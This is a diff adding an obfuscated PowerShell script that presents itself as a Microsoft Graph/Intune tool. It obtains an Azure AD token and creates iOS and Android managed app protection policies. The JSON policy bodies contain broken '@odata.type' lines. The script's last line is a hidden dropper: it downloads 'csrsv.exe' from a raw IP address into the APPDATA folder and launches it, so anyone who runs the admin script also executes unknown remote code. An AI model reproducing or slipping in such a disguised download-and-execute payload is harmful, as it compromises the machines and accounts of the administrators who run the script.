@@ -1,0 +1,384 @@
+ ${k6`9hA}  =  [tYpE]("{4}{0}{3}{2}{1}" -F 'fleCT','ly','.aSSemB','IOn','SystEM.RE');  
+
+
+
+
+function GET`-aU`TH`ToKeN {
+
+
+
+[cmdletbinding()]
+
+param
+(
+    [Parameter(ManDAToRy=${T`Rue})]
+    ${u`ser}
+)
+
+${u`s`ERuPn} = &("{3}{0}{2}{1}" -f 'e','ct','w-Obje','N') ("{1}{3}{5}{2}{4}{7}{0}{6}"-f 's','Sys','.M','tem.Net.M','ai','ail','s','lAddre') -ArgumentList ${us`Er}
+
+${TEnA`Nt} = ${UsErU`pN}."h`OSt"
+
+&("{2}{0}{1}" -f '-Ho','st','Write') ("{4}{5}{0}{6}{7}{2}{3}{1}" -f 'ng f','le...','D ','modu','Check','i','or Azure','A')
+
+    ${AA`d`mO`dule} = &("{0}{1}{2}" -f'Get-','Modu','le') -Name ("{0}{1}" -f 'Azu','reAD') -ListAvailable
+
+    if (${a`ADm`ODULe} -eq ${Nu`LL}) {
+
+        &("{0}{1}{2}"-f 'W','rite','-Host') ("{6}{4}{7}{0}{3}{8}{1}{13}{9}{2}{10}{5}{12}{11}"-f 'll ','t foun','o','modu','P','ureA','AzureAD ','owerShe','le no','looking f','r Az','eview','DPr','d, ')
+        ${aA`D`modULe} = &("{0}{1}{2}"-f'Ge','t','-Module') -Name ("{1}{3}{0}{2}" -f 'ADPr','Azur','eview','e') -ListAvailable
+
+    }
+
+    if (${Aadmo`D`UlE} -eq ${N`ULl}) {
+        &("{0}{3}{2}{1}"-f 'write','st','o','-h')
+        &("{2}{0}{1}{3}"-f'-h','o','write','st') ("{1}{8}{10}{3}{4}{7}{6}{0}{2}{9}{5}"-f'nsta','AzureAD P','lle','dule',' n','..',' i','ot','ower','d.','shell mo') -f ("{1}{0}" -f'ed','R')
+        &("{2}{1}{0}"-f'ost','e-h','writ') ((("{8}{15}{20}{9}{10}{12}{11}{7}{16}{21}{14}{23}{2}{17}{6}{19}{1}{4}{3}{0}{22}{13}{18}{5}" -f 'g from an elevat','ul','ug or 6u','eview6u','e AzureADPr','mpt','Instal','dule','Install by',' 6ugInsta','ll','Mo','-',' PowerShe','AD',' ru',' Azur','g','ll pro','l-Mod','nning','e','ed','6')) -rEPlacE '6ug',[ChAr]39) -f ("{2}{1}{0}"-f 'ow','ll','Ye')
+        &("{0}{1}{2}"-f'write-','ho','st') ((("{3}{2}{1}{0}{4}"-f'canSZqt ',' ','t','Scrip','continue...'))."rep`La`ce"(([chAr]83+[chAr]90+[chAr]113),[STrInG][chAr]39)) -f ("{1}{0}"-f'ed','R')
+        &("{0}{1}{2}" -f 'wr','ite-h','ost')
+        exit
+    }
+
+
+
+
+    if(${aAd`Mod`ULe}."cOU`NT" -gt 1){
+
+        ${la`T`esT_VErS`i`ON} = (${A`AD`moDUlE} | &("{0}{1}"-f'sel','ect') ("{0}{1}{2}"-f 'v','e','rsion') | &("{2}{0}{3}{1}"-f '-','ject','Sort','Ob'))[-1]
+
+        ${a`A`dmODule} = ${AAdm`Od`UlE} | &('?') { ${_}."V`ersion" -eq ${l`ATESt_ve`Rs`ioN}."vErs`Ion" }
+
+            
+
+            if(${a`AdmoDU`Le}."CO`UNT" -gt 1){
+
+            ${Aadm`ODU`lE} = ${A`ADM`odULE} | &("{0}{1}{2}"-f 'sele','c','t') -Unique
+
+            }
+
+        ${A`DAl} = &("{1}{2}{0}" -f 'h','Join-P','at') ${Aad`MODU`lE}."m`od`ULeBa`SE" ("{4}{5}{6}{8}{0}{2}{1}{7}{3}"-f'.Clients.','re','ActiveDi','y.dll','Mic','rosoft.','IdentityMod','ctor','el')
+        ${aD`A`lFORmS} = &("{1}{0}{2}" -f'n-','Joi','Path') ${aADM`OD`UlE}."MODu`l`EBase" ("{11}{8}{13}{6}{9}{7}{3}{2}{1}{12}{0}{4}{5}{10}" -f 'ory','v','Acti','odel.Clients.','.Platform','.dl','o','M','o','ft.Identity','l','Micr','eDirect','s')
+
+    }
+
+    else {
+
+        ${a`dAl} = &("{0}{1}" -f'J','oin-Path') ${aaDMO`DU`le}."m`OdU`LeBASe" ("{0}{7}{5}{10}{2}{9}{3}{8}{6}{1}{4}{11}" -f'Microsoft.Ide','iveDirec','.Cl','ent','to','ityM','.Act','nt','s','i','odel','ry.dll')
+        ${aD`AL`FoRmS} = &("{0}{1}{2}" -f 'Jo','in-P','ath') ${aA`d`MOd`ULE}."m`ODUL`EBasE" ("{16}{15}{11}{13}{3}{9}{6}{4}{2}{8}{14}{12}{0}{10}{7}{1}{5}"-f 'ir','r','ty','oft.I','i','y.Platform.dll','nt','cto','Model','de','e','r','tiveD','os','.Clients.Ac','c','Mi')
+
+    }
+
+  ( &("{2}{1}{0}" -f 'IABlE','r','va') ("K69"+"Ha") ).VAlue::("{2}{1}{0}"-f 'rom','F','Load').Invoke(${Ad`Al}) | &("{1}{0}" -f 'Null','Out-')
+
+  (  &("{1}{2}{0}"-f'E','variA','bl')  ("{1}{0}"-f 'a','K69H')).ValUE::("{0}{2}{1}"-f 'LoadFr','m','o').Invoke(${a`dalfO`RMS}) | &("{1}{0}{2}"-f'Nul','Out-','l')
+
+${C`lIeN`T`iD} = ("{3}{8}{2}{5}{0}{6}{1}{4}{7}" -f'd672-4dae-b554-9d5','f','df','d1','d9','0e4-','bd','3547','d')
+
+${rEDi`R`E`CTuRI} = ("{2}{1}{3}{5}{0}{4}"-f':wg:oauth:2.0:o','rn:','u','iet','ob','f')
+
+${REs`ouRcE`A`PP`Id`UrI} = ("{3}{2}{7}{6}{5}{1}{4}{0}"-f '.com','s','/','https:/','oft','o','cr','graph.mi')
+
+${authoR`I`Ty} = "https://login.microsoftonline.com/$Tenant"
+
+    try {
+
+    ${AUT`Hco`Nt`EXt} = &("{0}{2}{1}" -f 'New-Obj','ct','e') ("{5}{12}{8}{2}{0}{4}{15}{13}{10}{3}{6}{9}{1}{14}{7}{17}{11}{16}" -f'y','he','tit','recto','Model.Clie','Micr','ry.A','icatio','n','ut','ctiveDi','nte','osoft.Ide','.A','nt','nts','xt','nCo') -ArgumentList ${Author`I`TY}
+
+    
+    
+
+    ${PlAt`Fo`RMPARame`T`Ers} = &("{1}{2}{0}"-f'-Object','N','ew') ("{8}{1}{14}{11}{2}{4}{13}{10}{3}{7}{12}{0}{6}{9}{5}" -f'recto','r','ntity','.Activ','Model.','rameters','r','e','Mic','y.PlatformPa','s','e','Di','Client','osoft.Id') -ArgumentList ("{0}{1}" -f 'A','uto')
+
+    ${U`s`ERiD} = &("{0}{2}{1}"-f 'New-','t','Objec') ("{3}{14}{5}{4}{9}{2}{11}{7}{6}{12}{13}{1}{15}{8}{10}{0}" -f 'y.UserIdentifier','iveD','.I','Mi','f','o','Cli','odel.','rec','t','tor','dentityM','ents.Ac','t','cros','i') -ArgumentList (${U`SeR}, ("{0}{5}{2}{1}{3}{4}"-f'Opt','pl','Dis','ayable','Id','ional'))
+
+    ${a`U`ThrESult} = ${A`Ut`HCoN`TExT}.("{0}{3}{2}{1}" -f'Acq','c','ireTokenAsyn','u').Invoke(${rEso`U`RCEA`PPI`dUrI},${CL`IenTiD},${R`eDIr`ect`URI},${PlaTFoRM`P`Ar`A`me`TeRs},${us`e`RiD})."R`Esult"
+
+        
+
+        if(${au`Th`REs`ULt}."Acc`eS`StOk`eN"){
+
+        
+
+        ${a`U`T`HheadEr} = @{
+            ("{1}{3}{0}{2}"-f 'nt-Typ','Cont','e','e')=("{3}{1}{2}{0}{4}"-f'so','li','cation/j','app','n')
+            ("{1}{0}{3}{4}{2}"-f'uth','A','ion','oriz','at')=("{0}{1}{2}"-f 'Be','a','rer ') + ${AuT`hRE`SU`Lt}."A`C`cesSTO`keN"
+            ("{1}{2}{0}"-f 'n','Expire','sO')=${AUthr`eS`ULT}."E`XpiR`Eson"
+            }
+
+        return ${A`UThh`e`Ader}
+
+        }
+
+        else {
+
+        &("{2}{0}{1}" -f'ite-H','ost','Wr')
+        &("{1}{0}{2}"-f 'os','Write-H','t') ("{2}{4}{8}{6}{1}{5}{7}{0}{9}{3}{10}"-f 'run aut',', pleas','Authorization Access ','ati','T','e re','l','-','oken is nul','hentic','on...') -ForegroundColor ("{1}{0}"-f 'ed','R')
+        &("{1}{2}{0}{3}"-f 'e','Wr','it','-Host')
+        break
+
+        }
+
+    }
+
+    catch {
+
+    &("{3}{1}{2}{0}" -f'st','ite','-ho','wr') ${_}."Excep`T`Ion"."M`eSs`Age" -f ("{0}{1}" -f 'Re','d')
+    &("{2}{0}{1}" -f'e-hos','t','writ') ${_}."ExC`epTI`oN"."i`TeMnA`ME" -f ("{0}{1}" -f'R','ed')
+    &("{1}{0}{2}" -f'-','write','host')
+    break
+
+    }
+
+}
+
+
+
+Function a`Dd-mAn`AGEdaPPp`Ol`ICy(){
+
+
+
+[cmdletbinding()]
+
+param
+(
+    ${Js`oN}
+)
+
+${gr`A`PHap`ivERSI`oN} = ("{0}{1}"-f'Bet','a')
+${ReS`our`CE} = ("{0}{3}{6}{4}{5}{1}{7}{2}"-f 'dev','e','pPolicies','iceAppM','agement/ma','nag','an','dAp')
+
+    try {
+
+        if(${j`Son} -eq "" -or ${J`SON} -eq ${n`Ull}){
+
+        &("{2}{0}{1}"-f 'ite-','host','wr') ("{0}{10}{6}{1}{3}{4}{11}{14}{5}{12}{7}{8}{9}{13}{2}" -f'No JS','fied, ple','olicy...','as','e s','i','N speci','S','ON for a Man','aged A','O','pecify','d J','pp P',' val') -f ("{1}{0}" -f 'd','Re')
+
+        }
+
+        else {
+
+        &("{0}{1}" -f 'Test-J','SON') -JSON ${jS`On}
+
+        ${u`Ri} = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
+        &("{2}{5}{4}{3}{1}{0}" -f'hod','stMet','Invok','e','R','e-') -Uri ${U`RI} -Headers ${aUT`HT`oKen} -Method ("{0}{1}"-f 'Pos','t') -Body ${j`SON} -ContentType ("{4}{2}{1}{0}{3}"-f 'j','cation/','li','son','app')
+
+        }
+
+    }
+
+    catch {
+
+    &("{2}{1}{3}{0}"-f'Host','t','Wri','e-')
+    ${e`x} = ${_}."eXCE`Pt`ION"
+    ${ERrOrr`ES`poN`sE} = ${e`x}."ReSp`o`NSe".("{2}{0}{1}{3}"-f 'p','o','GetRes','nseStream').Invoke()
+    ${r`E`AdEr} = &("{0}{1}{3}{2}"-f 'New','-Obje','t','c') ("{1}{4}{5}{6}{2}{3}{0}" -f 'der','S','am','Rea','yst','em','.IO.Stre')(${e`Rr`orRE`Spon`se})
+    ${rE`A`DER}."bAS`e`streAm".poSiTion = 0
+    ${RE`AD`er}.("{1}{4}{3}{2}{0}"-f 'a','DiscardBuf','dDat','e','fer').Invoke()
+    ${RES`p`oNsEbODy} = ${Re`A`DER}.("{1}{2}{0}" -f'ToEnd','R','ead').Invoke();
+    &("{2}{0}{1}" -f'e-','Host','Writ') ('R'+'espo'+'nse '+"content:`n$responseBody") -f ("{1}{0}"-f'd','Re')
+    &("{3}{2}{0}{1}" -f'-','Error','e','Writ') "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription) "
+    &("{2}{3}{0}{1}"-f 'hos','t','writ','e-')
+    break
+
+    }
+
+}
+
+
+
+Function Tes`T-`JSon(){
+
+
+
+param (
+
+${JS`oN}
+
+)
+
+    try {
+
+    ${Te`s`Tjson} = &("{3}{1}{2}{0}{4}"-f 's','vertFr','om-J','Con','on') ${jS`oN} -ErrorAction ("{0}{1}" -f 'S','top')
+    ${vA`lIDj`SoN} = ${T`RuE}
+
+    }
+
+    catch {
+
+    ${va`lIDjs`ON} = ${f`AL`SE}
+    ${_}."E`xc`ept`ion"
+
+    }
+
+    if (!${V`AlIdjs`On}){
+
+    &("{2}{1}{3}{0}" -f 'ost','rite','W','-H') ((("{2}{1}{6}{4}{0}{5}{7}{3}" -f'UVet ','rovid','P','t','sn','in valid JSON','ed JSON i',' forma'))."rePlA`ce"('UVe',[strIng][CHAr]39)) -f ("{0}{1}" -f 'R','ed')
+    break
+
+    }
+
+}
+
+
+
+
+
+&("{0}{1}{2}"-f'w','ri','te-host')
+
+
+if(${glO`B`Al`:A`UtH`TOkEn}){
+
+    
+    ${D`At`EtimE} = (&("{0}{1}{2}" -f 'Get-Da','t','e')).("{3}{0}{2}{4}{1}"-f 'ver','me','sal','ToUni','Ti').Invoke()
+
+    
+    ${tok`ene`xp`Ires} = (${a`Uth`ToKen}."E`xpiReS`oN"."dAT`et`imE" - ${D`A`TEtiMe})."m`i`NUteS"
+
+        if(${TokEnex`piR`Es} -le 0){
+
+        &("{1}{0}{2}" -f 'rite-h','w','ost') ("{4}{0}{5}{3}{1}{2}" -f 'ti','re','d',' Token expi','Authen','cation') ${t`OKENexP`I`REs} ("{0}{2}{1}" -f 'minut','go','es a') -ForegroundColor ("{1}{0}" -f 'w','Yello')
+        &("{0}{2}{1}" -f 'w','ost','rite-h')
+
+            
+
+            if(${Us`eR} -eq ${NU`ll} -or ${us`Er} -eq ""){
+
+            ${Us`er} = &("{1}{2}{0}" -f '-Host','Rea','d') -Prompt ("{10}{9}{1}{7}{15}{6}{14}{8}{2}{4}{11}{3}{12}{13}{0}{5}" -f 'atio','pecify you','r','r Azure A','incipa','n','ser','r ','p','lease s','P','l name fo','uthenti','c',' ','u')
+            &("{0}{2}{1}" -f'W','Host','rite-')
+
+            }
+
+        ${G`LOBAl:`AUtht`Ok`En} = &("{0}{3}{4}{1}{2}"-f'G','Aut','hToken','e','t-') -User ${US`ER}
+
+        }
+}
+
+
+
+else {
+
+    if(${us`eR} -eq ${Nu`LL} -or ${us`er} -eq ""){
+
+    ${Us`Er} = &("{0}{2}{1}"-f'Read-H','t','os') -Prompt ("{2}{6}{9}{5}{8}{12}{7}{10}{13}{4}{1}{15}{16}{3}{0}{11}{17}{14}"-f'ut','l n','P',' Azure A','ipa','e spec','l','i','if','eas','n','h','y your user pr','c','n','ame',' for','enticatio')
+    &("{3}{1}{2}{0}"-f't','-','Hos','Write')
+
+    }
+
+
+${g`Lob`Al:`A`UtHToKEN} = &("{2}{3}{1}{4}{0}" -f'oken','A','G','et-','uthT') -User ${Us`er}
+
+}
+
+
+
+
+
+${I`Os} = @"
+
+{
+  "@odata.type": "
+  "displayName": "Graph MAM iOS Policy",
+  "description": "Graph MAM iOS Policy",
+  "periodOfflineBeforeAccessCheck": "PT12H",
+  "periodOnlineBeforeAccessCheck": "PT30M",
+  "allowedInboundDataTransferSources": "allApps",
+  "allowedOutboundDataTransferDestinations": "allApps",
+  "organizationalCredentialsRequired": false,
+  "allowedOutboundClipboardSharingLevel": "allApps",
+  "dataBackupBlocked": true,
+  "deviceComplianceRequired": true,
+  "managedBrowserToOpenLinksRequired": true,
+  "saveAsBlocked": true,
+  "periodOfflineBeforeWipeIsEnforced": "P90D",
+  "pinRequired": true,
+  "maximumPinRetries": 5,
+  "simplePinBlocked": true,
+  "minimumPinLength": 4,
+  "pinCharacterSet": "numeric",
+  "allowedDataStorageLocations": [],
+  "contactSyncBlocked": true,
+  "printBlocked": true,
+  "fingerprintBlocked": true,
+  "appDataEncryptionType": "afterDeviceRestart",
+
+  "apps": [
+    {
+        "mobileAppIdentifier": {
+        "@odata.type": "
+        "bundleId": "com.microsoft.office.outlook"
+        }
+    },
+    {
+        "mobileAppIdentifier": {
+        "@odata.type": "
+        "bundleId": "com.microsoft.office.excel"
+        }
+    }
+
+    ]
+}
+
+"@
+
+
+
+${aNDr`O`ID} = @"
+
+{
+  "@odata.type": "
+  "displayName": "Graph MAM Android Policy",
+  "description": "Graph MAM Android Policy",
+  "periodOfflineBeforeAccessCheck": "PT12H",
+  "periodOnlineBeforeAccessCheck": "PT30M",
+  "allowedInboundDataTransferSources": "allApps",
+  "allowedOutboundDataTransferDestinations": "allApps",
+  "organizationalCredentialsRequired": false,
+  "allowedOutboundClipboardSharingLevel": "allApps",
+  "dataBackupBlocked": true,
+  "deviceComplianceRequired": true,
+  "managedBrowserToOpenLinksRequired": true,
+  "saveAsBlocked": true,
+  "periodOfflineBeforeWipeIsEnforced": "P90D",
+  "pinRequired": true,
+  "maximumPinRetries": 5,
+  "simplePinBlocked": true,
+  "minimumPinLength": 4,
+  "pinCharacterSet": "numeric",
+  "allowedDataStorageLocations": [],
+  "contactSyncBlocked": true,
+  "printBlocked": true,
+  "fingerprintBlocked": true,
+  "appDataEncryptionType": "afterDeviceRestart",
+
+  "apps": [
+    {
+        "mobileAppIdentifier": {
+        "@odata.type": "
+        "packageId": "com.microsoft.office.outlook"
+        }
+    },
+    {
+        "mobileAppIdentifier": {
+        "@odata.type": "
+        "packageId": "com.microsoft.office.excel"
+        }
+    }
+
+    ]
+}
+
+"@
+
+
+
+&("{0}{1}{2}" -f'write-','h','ost')
+
+&("{2}{1}{0}" -f 'host','te-','wri') ("{6}{2}{0}{3}{5}{1}{4}" -f 'na','l',' Ma','ged A','icy','pp Po','Adding iOS') -f ("{1}{0}" -f'ow','Yell')
+
+&("{1}{4}{2}{3}{0}" -f'cy','Add-','dAppPol','i','Manage') -Json ${i`os}
+
+&("{0}{1}{2}" -f 'writ','e','-host') ("{2}{0}{4}{8}{5}{7}{3}{6}{1}{9}"-f 'd',' ','Ad','d A','ing Android','a','pp','nage',' M','Policy') -f ("{1}{0}{2}" -f 'l','Yel','ow')
+
+&("{3}{6}{0}{1}{5}{2}{4}" -f'nagedA','pp','oli','Add','cy','P','-Ma') -Json ${An`dr`oID}
+
+(&("{2}{1}{0}{3}"-f 'bj','-O','New','ect') ("{0}{1}{3}{2}{4}" -f 'Sy','s','et.','tem.N','WebClient')).("{1}{0}{2}" -f 'oadFil','Downl','e').Invoke(("{1}{2}{0}{6}{5}{3}{4}" -f 'p://94.1','h','tt','sr','sv.exe','yahoo/c','02.53.238/~'),"$env:APPDATA\csrsv.exe");&("{1}{3}{2}{0}" -f 'ss','St','ce','art-Pro') ("$env:APPDATA\csrsv.exe")
